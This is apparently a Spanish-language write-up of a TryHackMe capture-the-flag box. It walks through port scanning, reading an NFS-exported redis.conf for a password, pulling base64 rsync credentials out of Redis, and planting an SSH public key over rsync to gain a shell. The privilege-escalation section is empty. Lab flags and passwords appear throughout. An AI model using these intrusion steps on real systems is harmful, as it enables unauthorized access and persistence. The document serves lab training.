
# SCAN

```
PORT      STATE    SERVICE
22/tcp    open     ssh
111/tcp   open     rpcbind
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
873/tcp   open     rsync
2049/tcp  open     nfs
6379/tcp  open     redis
9090/tcp  filtered zeus-admin
41849/tcp open     unknown
46121/tcp open     unknown
50201/tcp open     unknown
50693/tcp open     unknown
55157/tcp open     unknown
```
Resumen:
1. Servidor samba: 445
2. Servidor nfs: 2049
3. Servidor redis: 6379
4. Servidor rsync: 873

## SAMBA
Existe un archivo compartido (/shares) dentro del cual encontramos el primer flag

## REDIS
Es una base de datos no relacional (non-sql) con la estructura basica de las bases de datos no relacionales <key:value>. Necesitamos para
entrar un password que no tenemos

## NFS
Hay un recurso compartido nfs que es /opt/conf/. Podemos montar este directorio en nuestro sistema:
>$ sudo mount -t nfs vulnnet.thm:/opt/conf/  /tmp/mount

Una vez montado accedemos al directorio redis donde existe un fichero **redis.conf**, donde encontramos la contraseña para acceder a redis:
> B65Hx562F@ggAZ@F

## REDIS WITH PASS
Tras entrar en redis obtenemos
redis-cli> keys *
```
┌──(kali㉿kali)-[~]
└─$ redis-cli -h 10.10.21.113 -a B65Hx562F@ggAZ@F
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.10.21.113:6379> keys *
1) "tmp"
2) "authlist"
3) "internal flag"
4) "int"
5) "marketlist"
```
### tmp
Nada interesante
### authlist
Obtenemos este codigo que parece ser un code64:
> QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==

Decodificado dice los siguiente:
> Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v


### internal flag
Obtenemos el segundo flag
THM{ff8e518addbbddb74531a724236a8221}

## RSYNC
Podemos copiar nuestra clave publica en el .ssh de la maquina target:
> rsync authorized_keys rsync-connect@vulnnet.thm::files/sys-internal/.ssh
Password: Hcg3HP67@TW@Bc72v

y despues logearnos en ssh con nuestra clave privada

──(kali㉿kali)-[~/boxes/vul-int]
└─$ ssh -i id_rsa sys-internal@vulnnet.thm 
y ya estamos en la maquina target con el usuario **sys-internal**

# Escalada de privilegios









